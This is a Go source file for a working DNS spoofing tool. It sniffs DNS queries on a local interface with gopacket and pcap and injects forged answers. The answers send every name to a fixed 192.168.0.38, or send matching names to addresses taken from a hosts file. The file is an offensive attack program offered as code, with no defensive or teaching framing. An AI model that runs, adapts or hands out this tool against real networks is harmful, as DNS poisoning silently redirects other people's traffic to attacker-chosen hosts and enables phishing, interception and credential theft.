package main

import (
	"fmt"
	"flag"
	"log"
	"os"
	"strings"
	"net"
	"regexp"
)
import "io/ioutil" 
import "github.com/google/gopacket"
import "github.com/google/gopacket/pcap"
import "github.com/google/gopacket/layers"

var(
	dnsSpoofAllPacketsWithIP = net.IP{192, 168, 0, 38}
)

func main() {

	interfaceName  := flag.String("i","none","Name of the device to spectate data for.")

	hostNamesFile  := flag.String("f","none","hostname file name ")

	bpfFilterStrings := os.Args[1:]

	flag.Parse()

	bpfFilterString := ""

	for j := 0; j <= len(bpfFilterStrings)-1 ; j++ {
        if(strings.Contains(bpfFilterStrings[j],"-i") || strings.Contains(bpfFilterStrings[j],"-f")){
			bpfFilterStrings[j] = ""
			bpfFilterStrings[j+1] = ""
			j = j+1;
		}else{
			bpfFilterString = bpfFilterString + bpfFilterStrings[j] + " "
		}
    }

	var hostsMap map[string]net.IP;
	if (*hostNamesFile != "none"){
		dnsSpoofAllPacketsWithIP = nil
		hostsMap = readHostsFileIntoHashMap(*hostNamesFile)
		fmt.Println("Using hostnames from File : ", hostsMap)
	}else{
		fmt.Println("Using the default IP :", dnsSpoofAllPacketsWithIP , " to spoof all DNS requests")
	}

	if( len(hostsMap) != 0 || dnsSpoofAllPacketsWithIP != nil){
		if(checkIfDeviceExists(*interfaceName)){
			liveCaptureAndDNSReply(*interfaceName,bpfFilterString, hostsMap)
		}else{
			defaultInterfaceName :=  getFirstDevice()
			fmt.Println("The entered " + *interfaceName + " device does not exist. Below listed are the available devices. Using the default device : ", defaultInterfaceName)
			//printAllDeviceDetails();
			liveCaptureAndDNSReply(defaultInterfaceName, bpfFilterString, hostsMap)
		}
	}else{
		fmt.Println("The given file did not have any values. SO please retry with a valid file or without a -f flag.")
	}
}

func liveCaptureAndDNSReply(deviceName string ,bpfFilterString string, hashMapObj map[string]net.IP){

	handle, err := pcap.OpenLive(deviceName, int32(1600), false, pcap.BlockForever)
	defer handle.Close()

	if err != nil {
		log.Fatal(err)
	}else {
		var appendFilter string = "udp and dest port 53"
		if(bpfFilterString != ""){
			appendFilter = appendFilter + " and " + bpfFilterString
		}
		err = handle.SetBPFFilter(appendFilter)
		if err != nil {
			log.Fatal(err)
		}
		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
		for packet := range packetSource.Packets() {
			sendRespPacket(handle, packet, hashMapObj)
		}
	  }
}

func sendRespPacket(handle *pcap.Handle, packet gopacket.Packet, hostMap map[string]net.IP){

	dnsLayer := packet.Layer(layers.LayerTypeDNS)
	dns, _ := dnsLayer.(*layers.DNS)

	if dns.QR == false {
		query := string(dns.Questions[0].Name)
		spoofAddress := match(hostMap, query)
		if spoofAddress == nil {
			fmt.Println("Domain Name does not exist in host_names file. So not poisoning it.")
			return
		}

		ethernetLayer := packet.Layer(layers.LayerTypeEthernet);
		ethernetPacket, _ := ethernetLayer.(*layers.Ethernet)
		respEthernetLayer := layers.Ethernet{
			SrcMAC : ethernetPacket.DstMAC,
			DstMAC : ethernetPacket.SrcMAC,
			EthernetType: layers.EthernetTypeIPv4,
		}

		answers := make([]layers.DNSResourceRecord,1)

		answer := layers.DNSResourceRecord{
			Name: dns.Questions[0].Name,
			Type: layers.DNSTypeA,
			Class: layers.DNSClassIN,
			TTL: 60,
			IP: spoofAddress.To4(),
		}

		answers[0] = answer

		respDNSLayer := layers.DNS{
			ID: dns.ID,
			QR: true,
			OpCode: layers.DNSOpCodeQuery,
			AA: false,
			TC: true,
			RD: true,
			RA: true,
			ResponseCode: layers.DNSResponseCodeNoErr,
			QDCount: 1,
			ANCount: 1,
			NSCount: 0,
			ARCount: 0,
			Questions : dns.Questions,
			Answers: answers,
		}

		//If using UDP
		udpLayer := packet.Layer(layers.LayerTypeUDP)
		udp, _ := udpLayer.(*layers.UDP)
		respUDPLayer := layers.UDP{
			SrcPort: udp.DstPort,
			DstPort: udp.SrcPort,
		}

		// Ip layer data fetching
		ip4Layer := packet.Layer(layers.LayerTypeIPv4)
		ip4, _ := ip4Layer.(*layers.IPv4)
		var respIPv4layer layers.IPv4
		if( ip4!= nil){
			respIPv4layer = layers.IPv4{
			Version:4,
			TTL: 64,
			Protocol: layers.IPProtocolUDP,
			SrcIP: ip4.DstIP,
			DstIP: ip4.SrcIP,
			}
			respUDPLayer.SetNetworkLayerForChecksum(&respIPv4layer)
		}
		/*ip6Layer := packet.Layer(layers.LayerTypeIPv6)
		ip6, _ := ip6Layer.(*layers.IPv6)
		var respIPv6layer layers.IPv6
		if( ip6!= nil){
			respIPv6layer = layers.IPv6{
			Version:6,
			SrcIP: ip6.DstIP,
			DstIP: ip6.SrcIP,
			}
			respUDPLayer.SetNetworkLayerForChecksum(&respIPv6layer)
		}*/

		// fmt.Println("Full DNS packet : ", (dns.ID))
		// for i,q := range dns.Questions {
		// 	fmt.Println("DNS Question is : ",i,string(q.Name))
		// }
		// for i,ans := range dns.Answers {
		// 	fmt.Println("DNS Answers is : ",i,ans.IP.String())
		// }

		options := gopacket.SerializeOptions{
			ComputeChecksums: true,
			FixLengths: true,
		}

		buffer := gopacket.NewSerializeBuffer()
		/*if( ip6!= nil){
			gopacket.SerializeLayers(buffer,
				options,
				&respDNSLayer,
				&respEthernetLayer,
				&respIPv6layer,
				&respUDPLayer,
				gopacket.Payload([]byte{}))
		} else{*/
			gopacket.SerializeLayers(buffer,
				options,
				&respDNSLayer,
				&respEthernetLayer,
				&respIPv4layer,
				&respUDPLayer,)
		//}

		outgoingPacket := buffer.Bytes()
		// Send our packet
		fmt.Println("Buffer layers", buffer.Layers())
		err := handle.WritePacketData(outgoingPacket)

		if err != nil {
			log.Fatal(err)
		}else{
			fmt.Println("*** SENT Response DNS packet *** with answer Ip as : ", spoofAddress )
		}
	}/*else{
		fmt.Println("********** NOT SENT ************ as it was response",  )
	}*/
	
}

//------------------------------------------------------------------------------------------------------------------------------------


func readHostsFileIntoHashMap(fileName string) map[string]net.IP{ 

	fmt.Println("Reading hosts file")

	hostsMap := make(map[string]net.IP)
	dat, err := ioutil.ReadFile(fileName)
	if(err != nil){
		fmt.Println((err))
		fmt.Println("Please provide a valid hostfile. Or run without the -f flag.")
		return nil
	}
	
	hostsAsString := string(dat);
	lineSplitHosts := strings.Split(hostsAsString, "\n")

	for host := range lineSplitHosts {
		pair := strings.Split(strings.TrimSpace(lineSplitHosts[host]), " ")
		if len(pair) >= 2 {
			hostsMap[pair[len(pair)-1]] = net.ParseIP(pair[0])
		}
	}
	
	return hostsMap
}

func match(hostMap map[string]net.IP, query string) net.IP {
	fmt.Println("Querying hashmap for domain name : " , query)
	if(dnsSpoofAllPacketsWithIP!=nil){
		return dnsSpoofAllPacketsWithIP
	}
	for domain, ip := range hostMap {
		pattern := strings.ReplaceAll(domain, "*", ".*")
		match, _ := regexp.MatchString(pattern, query)
		if match {
			return ip
		}
	}
	return nil
}

//-----------------------------------------------------------------

func checkIfDeviceExists(deviceName string) bool{ 

	devices, err := pcap.FindAllDevs()
    if err != nil {
        log.Fatal(err)
    }
    for _, device := range devices {
        if(deviceName == device.Name){
			return true;
		}
    }
	return false
}

func getFirstDevice() string{
	devices, err := pcap.FindAllDevs()
    if err != nil {
        log.Fatal(err)
    }
	return devices[0].Name;
}

func printAllDeviceDetails(){
	devices, err := pcap.FindAllDevs()
    if err != nil {
        log.Fatal(err)
    }
    
    for _, device := range devices {
        fmt.Println( "Device Name: ", device.Name)
        fmt.Println( "Description: ", device.Description)
        fmt.Println( "Devices addresses: ", device.Description)
        for _, address := range device.Addresses {
            fmt.Println("  IP address: ", address.IP)
            fmt.Println("  Subnet mask: ", address.Netmask)
			fmt.Println("  device ", device)
        }
    }
}

